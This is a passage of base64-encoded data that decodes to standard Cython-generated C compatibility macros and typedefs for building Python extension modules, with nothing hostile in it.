4MDMwZDAwQjEpCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAxCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TKQogICAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTUgJiYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFKQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogICAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAoIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HKQogICNlbmRpZgojZW5kaWYKI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNDQUxMCiNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQ0FMTCAgQ1lUSE9OX0ZBU1RfUFlDQUxMCiNlbmRpZgojaWZuZGVmIENZVEhPTl9WRUNUT1JDQUxMCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNkZWZpbmUgQ1lUSE9OX1ZFQ1RPUkNBTEwgIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApCiNlbHNlCiNkZWZpbmUgQ1lUSE9OX1ZFQ1RPUkNBTEwgIChDWVRIT05fRkFTVF9QWUNDQUxMICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwQjEpCiNlbmRpZgojZW5kaWYKI2RlZmluZSBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCAoQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMEIxKQojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgI3VuZGVmIFNISUZUCiAgI3VuZGVmIEJBU0UKICAjdW5kZWYgTUFTSwogICNpZmRlZiBTSVpFT0ZfVk9JRF9QCiAgICBlbnVtIHsgX19weXhfY2hlY2tfc2l6ZW9mX3ZvaWRwID0gMSAvIChpbnQpKFNJWkVPRl9WT0lEX1AgPT0gc2l6ZW9mKHZvaWQqKSkgfTsKICAjZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX0xPQ0tfQU5EX0dJTF9ERUFETE9DS19BVk9JREFOQ0VfVElNRQogICNkZWZpbmUgQ1lUSE9OX0xPQ0tfQU5EX0dJTF9ERUFETE9DS19BVk9JREFOQ0VfVElNRSAxMDAKI2VuZGlmCiNpZm5kZWYgX19oYXNfYXR0cmlidXRlCiAgI2RlZmluZSBfX2hhc19hdHRyaWJ1dGUoeCkgMAojZW5kaWYKI2lmbmRlZiBfX2hhc19jcHBfYXR0cmlidXRlCiAgI2RlZmluZSBfX2hhc19jcHBfYXR0cmlidXRlKHgpIDAKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX1JFU1RSSUNUCiAgI2lmIGRlZmluZWQoX19HTlVDX18pCiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCBfX3Jlc3RyaWN0X18KICAjZWxpZiBkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNDAwCiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCBfX3Jlc3RyaWN0CiAgI2VsaWYgZGVmaW5lZCAoX19TVERDX1ZFUlNJT05fXykgJiYgX19TVERDX1ZFUlNJT05fXyA+PSAxOTk5MDFMCiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCByZXN0cmljdAogICNlbHNlCiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVAogICNlbmRpZgojZW5kaWYKI2lmbmRlZiBDWVRIT05fVU5VU0VECiAgI2lmIGRlZmluZWQoX19jcGx1c3BsdXMpCiAgICAKICAgICNpZiAoKGRlZmluZWQoX01TVkNfTEFORykgJiYgX01TVkNfTEFORyA+PSAyMDE3MDNMKSB8fCBfX2NwbHVzcGx1cyA+PSAyMDE3MDNMKQogICAgICAjaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShtYXliZV91bnVzZWQpCiAgICAgICAgI2RlZmluZSBDWVRIT05fVU5VU0VEIFtbbWF5YmVfdW51c2VkXV0KICAgICAgI2VuZGlmCiAgICAjZW5kaWYKICAjZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX1VOVVNFRAojIGlmIGRlZmluZWQoX19HTlVDX18pCiMgICBpZiAhKGRlZmluZWQoX19jcGx1c3BsdXMpKSB8fCAoX19HTlVDX18gPiAzIHx8IChfX0dOVUNfXyA9PSAzICYmIF9fR05VQ19NSU5PUl9fID49IDQpKQojICAgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRCBfX2F0dHJpYnV0ZV9fICgoX191bnVzZWRfXykpCiMgICBlbHNlCiMgICAgIGRlZmluZSBDWVRIT05fVU5VU0VECiMgICBlbmRpZgojIGVsaWYgZGVmaW5lZChfX0lDQykgfHwgKGRlZmluZWQoX19JTlRFTF9DT01QSUxFUikgJiYgIWRlZmluZWQoX01TQ19WRVIpKQojICAgZGVmaW5lIENZVEhPTl9VTlVTRUQgX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKQojIGVsc2UKIyAgIGRlZmluZSBDWVRIT05fVU5VU0VECiMgZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX1VOVVNFRF9WQVIKIyAgaWYgZGVmaW5lZChfX2NwbHVzcGx1cykKICAgICB0ZW1wbGF0ZTxjbGFzcyBUPiB2b2lkIENZVEhPTl9VTlVTRURfVkFSKCBjb25zdCBUJiApIHsgfQojICBlbHNlCiMgICAgZGVmaW5lIENZVEhPTl9VTlVTRURfVkFSKHgpICh2b2lkKSh4KQojICBlbmRpZgojZW5kaWYKI2lmbmRlZiBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUgogICNkZWZpbmUgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoeCkgQ1lUSE9OX1VOVVNFRF9WQVIoeCkKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX05DUF9VTlVTRUQKIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiMgIGRlZmluZSBDWVRIT05fTkNQX1VOVVNFRAojIGVsc2UKIyAgZGVmaW5lIENZVEhPTl9OQ1BfVU5VU0VEIENZVEhPTl9VTlVTRUQKIyBlbmRpZgojZW5kaWYKI2lmbmRlZiBDWVRIT05fVVNFX0NQUF9TVERfTU9WRQogICNpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXAogICAgX19jcGx1c3BsdXMgPj0gMjAxMTAzTCB8fCAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTYwMCkpCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFIDEKICAjZWxzZQogICAgI2RlZmluZSBDWVRIT05fVVNFX0NQUF9TVERfTU9WRSAwCiAgI2VuZGlmCiNlbmRpZgojZGVmaW5lIF9fUHl4X3ZvaWRfdG9fTm9uZSh2b2lkX3Jlc3VsdCkgKCh2b2lkKSh2b2lkX3Jlc3VsdCksIFB5X0lOQ1JFRihQeV9Ob25lKSwgUHlfTm9uZSkKI2lmZGVmIF9NU0NfVkVSCiAgICAjaWZuZGVmIF9NU0NfU1RESU5UX0hfCiAgICAgICAgI2lmIF9NU0NfVkVSIDwgMTMwMAogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGNoYXIgICAgIHVpbnQ4X3Q7CiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgc2hvcnQgICAgdWludDE2X3Q7CiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgaW50ICAgICAgdWludDMyX3Q7CiAgICAgICAgI2Vsc2UKICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDggICB1aW50OF90OwogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50MTYgIHVpbnQxNl90OwogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50MzIgIHVpbnQzMl90OwogICAgICAgICNlbmRpZgogICAgI2VuZGlmCiAgICAjaWYgX01TQ19WRVIgPCAxMzAwCiAgICAgICAgI2lmZGVmIF9XSU42NAogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGxvbmcgbG9uZyAgX19weXhfdWludHB0cl90OwogICAgICAgICNlbHNlCiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgaW50ICAgICAgICBfX3B5eF91aW50cHRyX3Q7CiAgICAgICAgI2VuZGlmCiAgICAjZWxzZQogICAgICAgICNpZmRlZiBfV0lONjQKICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDY0ICAgIF9fcHl4X3VpbnRwdHJfdDsKICAgICAgICAjZWxzZQogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50MzIgICAgX19weXhfdWludHB0cl90OwogICAgICAgICNlbmRpZgogICAgI2VuZGlmCiNlbHNlCiAgICAjaW5jbHVkZSA8c3RkaW50Lmg+CiAgICB0eXBlZGVmIHVpbnRwdHJfdCAgX19weXhfdWludHB0cl90OwojZW5kaWYKI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0gKICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cykKICAgIAogICAgI2lmICgoZGVmaW5lZChfTVNWQ19MQU5HKSAmJiBfTVNWQ19MQU5HID49IDIwMTcwM0wpIHx8IF9fY3BsdXNwbHVzID49IDIwMTcwM0wpCiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKGZhbGx0aHJvdWdoKQogICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbZmFsbHRocm91Z2hdXQogICAgICAjZW5kaWYKICAgICNlbmRpZgogICAgI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0gKICAgICAgI2lmIF9faGFzX2NwcF9hdHRyaWJ1dGUoY2xhbmc6OmZhbGx0aHJvdWdoKQogICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbY2xhbmc6OmZhbGx0aHJvdWdoXV0KICAgICAgI2VsaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShnbnU6OmZhbGx0aHJvdWdoKQogICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbZ251OjpmYWxsdGhyb3VnaF1dCiAgICAgICNlbmRpZgogICAgI2VuZGlmCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0gKICAgICNpZiBfX2hhc19hdHRyaWJ1dGUoZmFsbHRocm91Z2gpCiAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIF9fYXR0cmlidXRlX18oKGZhbGx0aHJvdWdoKSkKICAgICNlbHNlCiAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdICiAgICAjZW5kaWYKICAjZW5kaWYKICAjaWYgZGVmaW5lZChfX2NsYW5nX18pICYmIGRlZmluZWQoX19hcHBsZV9idWlsZF92ZXJzaW9uX18pCiAgICAjaWYgX19hcHBsZV9idWlsZF92ZXJzaW9uX18gPCA3MDAwMDAwCiAgICAgICN1bmRlZiAgQ1lUSE9OX0ZBTExUSFJPVUdICiAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdICiAgICAjZW5kaWYKICAjZW5kaWYKI2VuZGlmCiNpZm5kZWYgUHlfVU5SRUFDSEFCTEUKICAjZGVmaW5lIFB5X1VOUkVBQ0hBQkxFKCkgIGFzc2VydCgwKTsgYWJvcnQoKQojZW5kaWYKI2lmZGVmIF9fY3BsdXNwbHVzCiAgdGVtcGxhdGUgPHR5cGVuYW1lIFQ+CiAgc3RydWN0IF9fUFlYX0lTX1VOU0lHTkVEX0lNUEwge3N0YXRpYyBjb25zdCBib29sIHZhbHVlID0gVCgwKSA8IFQoLTEpO307CiAgI2RlZmluZSBfX1BZWF9JU19VTlNJR05FRCh0eXBlKSAoX19QWVhfSVNfVU5TSUdORURfSU1QTDx0eXBlPjo6dmFsdWUpCiNlbHNlCiAgI2RlZmluZSBfX1BZWF9JU19VTlNJR05FRCh0eXBlKSAoKCh0eXBlKS0xKSA+IDApCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZID09IDEKICAjZGVmaW5lIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCAgKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwKQojZWxzZQogICNkZWZpbmUgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UICAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApCiNlbmRpZgojZGVmaW5lIF9fUFlYX1JFSU5URVJQUkVUX0ZVTkNJT04oZnVuY19wb2ludGVyLCBvdGhlcl9wb2ludGVyKSAoKGZ1bmNfcG9pbnRlcikodm9pZCgqKSh2b2lkKSkob3RoZXJfcG9pbnRlcikpCgoKI2lmbmRlZiBDWVRIT05fSU5MSU5FCiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKQogICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lX18gX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKQogICNlbGlmIGRlZmluZWQoX19HTlVDX18pCiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgX19pbmxpbmVfXwogICNlbGlmIGRlZmluZWQoX01TQ19WRVIpCiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgX19pbmxpbmUKICAjZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUwKICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBpbmxpbmUKICAjZWxzZQogICAgI2RlZmluZSBDWVRIT05fSU5MSU5FCiAgI2VuZGlmCiNlbmRpZgoKCiNkZWZpbmUgX19QWVhfQlVJTERfUFlfU1NJWkVfVCAibiIKI2RlZmluZSBDWVRIT05fRk9STUFUX1NTSVpFX1QgInoiCiNkZWZpbmUgX19QeXhfQlVJTFRJTl9NT0RVTEVfTkFNRSAiYnVpbHRpbnMiCiNkZWZpbmUgX19QeXhfRGVmYXVsdENsYXNzVHlwZSBQeVR5cGVfVHlwZQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgI2lmbmRlZiBDT19PUFRJTUlaRUQKICAgIHN0YXRpYyBpbnQgQ09fT1BUSU1JWkVEOwogICAgI2VuZGlmCiAgICAjaWZuZGVmIENPX05FV0xPQ0FMUwogICAgc3RhdGljIGludCBDT19ORVdMT0NBTFM7CiAgICAjZW5kaWYKICAgICNpZm5kZWYgQ09fVkFSQVJHUwogICAgc3RhdGljIGludCBDT19WQVJBUkdTOwogICAgI2VuZGlmCiAgICAjaWZuZGVmIENPX1ZBUktFWVdPUkRTCiAgICBzdGF0aWMgaW50IENPX1ZBUktFWVdPUkRTOwogICAgI2VuZGlmCiAgICAjaWZuZGVmIENPX0FTWU5DX0dFTkVSQVRPUgogICAgc3RhdGljIGludCBDT19BU1lOQ19HRU5FUkFUT1I7CiAgICAjZW5kaWYKICAgICNpZm5kZWYgQ09fR0VORVJBVE9SCiAgICBzdGF0aWMgaW50IENPX0dFTkVSQVRPUjsKICAgICNlbmRpZgogICAgI2lmbmRlZiBDT19DT1JPVVRJTkUKICAgIHN0YXRpYyBpbnQgQ09fQ09ST1VUSU5FOwogICAgI2VuZGlmCiNlbHNlCiAgICAjaWZuZGVmIENPX0NPUk9VVElORQogICAgICAjZGVmaW5lIENPX0NPUk9VVElORSAweDgwCiAgICAjZW5kaWYKICAgICNpZm5kZWYgQ09fQVNZTkNfR0VORVJBVE9SCiAgICAgICNkZWZpbmUgQ09fQVNZTkNfR0VORVJBVE9SIDB4MjAwCiAgICAjZW5kaWYKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCk7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEE0IHx8IGRlZmluZWQoUHlfSVNfVFlQRSkKICAjZGVmaW5lIF9fUHl4X0lTX1RZUEUob2IsIHR5cGUpIFB5X0lTX1RZUEUob2IsIHR5cGUpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9JU19UWVBFKG9iLCB0eXBlKSAoKChjb25zdCBQeU9iamVjdCopb2IpLT5vYl90eXBlID09ICh0eXBlKSkKI2VuZGlmCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXMpCiAgI2RlZmluZSBfX1B5eF9QeV9Jcyh4LCB5KSAgUHlfSXMoeCwgeSkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5X0lzKHgsIHkpICgoeCkgPT0gKHkpKQojZW5kaWYKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwQjEgfHwgZGVmaW5lZChQeV9Jc05vbmUpCiAgI2RlZmluZSBfX1B5eF9QeV9Jc05vbmUob2IpIFB5X0lzTm9uZShvYikKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5X0lzTm9uZShvYikgX19QeXhfUHlfSXMoKG9iKSwgUHlfTm9uZSkKI2VuZGlmCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNUcnVlKQogICNkZWZpbmUgX19QeXhfUHlfSXNUcnVlKG9iKSBQeV9Jc1RydWUob2IpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeV9Jc1RydWUob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X1RydWUpCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzRmFsc2UpCiAgI2RlZmluZSBfX1B5eF9QeV9Jc0ZhbHNlKG9iKSBQeV9Jc0ZhbHNlKG9iKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlfSXNGYWxzZShvYikgX19QeXhfUHlfSXMoKG9iKSwgUHlfRmFsc2UpCiNlbmRpZgojZGVmaW5lIF9fUHl4X05vbmVBc051bGwob2JqKSAgKF9fUHl4X1B5X0lzTm9uZShvYmopID8gTlVMTCA6IChvYmopKQojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBGMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSBQeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykgX1B5R0NfRklOQUxJWkVEKG8pCiNlbmRpZgojaWZuZGVmIFB5X1RQRkxBR1NfQ0hFQ0tUWVBFUwogICNkZWZpbmUgUHlfVFBGTEFHU19DSEVDS1RZUEVTIDAKI2VuZGlmCiNpZm5kZWYgUHlfVFBGTEFHU19IQVZFX0lOREVYCiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfSU5ERVggMAojZW5kaWYKI2lmbmRlZiBQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSCiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSIDAKI2VuZGlmCiNpZm5kZWYgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFCiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUgMAojZW5kaWYKI2lmbmRlZiBQeV9UUEZMQUdTX1NFUVVFTkNFCiAgI2RlZmluZSBQeV9UUEZMQUdTX1NFUVVFTkNFIDAKI2VuZGlmCiNpZm5kZWYgUHlfVFBGTEFHU19NQVBQSU5HCiAgI2RlZmluZSBQeV9UUEZMQUdTX01BUFBJTkcgMAojZW5kaWYKI2lmbmRlZiBNRVRIX1NUQUNLTEVTUwogICNkZWZpbmUgTUVUSF9TVEFDS0xFU1MgMAojZW5kaWYKI2lmbmRlZiBNRVRIX0ZBU1RDQUxMCiAgI2lmbmRlZiBNRVRIX0ZBU1RDQUxMCiAgICAgI2RlZmluZSBNRVRIX0ZBU1RDQUxMIDB4ODAKICAjZW5kaWYKICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MpOwogIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKSAoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICpjb25zdCAqYXJncywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKTsKI2Vsc2UKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3QgUHlDRnVuY3Rpb25GYXN0CiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMKICAjZWxzZQogICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3QgX1B5Q0Z1bmN0aW9uRmFzdAogICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMgX1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcwogICNlbmRpZgojZW5kaWYKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2RlZmluZSBfX1B5eF9NRVRIX0ZBU1RDQUxMIE1FVEhfRkFTVENBTEwKICAjZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdAogICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMgX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9NRVRIX0ZBU1RDQUxMIE1FVEhfVkFSQVJHUwogICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgUHlDRnVuY3Rpb24KICAjZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzIFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzCiNlbmRpZgojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwKICAjZGVmaW5lIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZlY3RvcmNhbGxmdW5jCiAgI2RlZmluZSBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQgIFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVAogICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICBQeVZlY3RvcmNhbGxfTkFSR1MoKHNpemVfdCkobikpCiNlbGlmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgdHlwZWRlZiBQeU9iamVjdCAqKCpfX3B5eF92ZWN0b3JjYWxsZnVuYykoUHlPYmplY3QgKmNhbGxhYmxlLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwogICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICAoKHNpemVfdCkxIDw8ICg4ICogc2l6ZW9mKHNpemVfdCkgLSAxKSkKICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9OQVJHUyhuKSAgKChQeV9zc2l6ZV90KSgoKHNpemVfdCkobikpICYgfl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQgIDAKICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9OQVJHUyhuKSAgKChQeV9zc2l6ZV90KShuKSkKI2VuZGlmCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEIxCiNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fQ2hlY2tFeGFjdChmdW5jKSAgUHlDRnVuY3Rpb25fQ2hlY2tFeGFjdChmdW5jKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykgIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpCiNlbmRpZgojZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAgUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgojZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KikoZnVuYykpLT5tX21sLT5tbF9tZXRoKQojZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQojZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgIFB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgojZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KikoZnVuYykpLT5tX21sLT5tbF9mbGFncykKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihQeU9iamVjdCAqZnVuYykgewogICAgcmV0dXJuIChfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICYgTUVUSF9TVEFUSUMpID8gTlVMTCA6ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX3NlbGY7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICByZXR1cm4gUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKI2Vsc2UKICAgIHJldHVybiBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKI2VuZGlmCn0KI2RlZmluZSBfX1B5eF9Jc1NhbWVDRnVuY3Rpb24oZnVuYywgY2Z1bmMpICAgX19QeXhfX0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCiAgI2RlZmluZSBfX1B5eF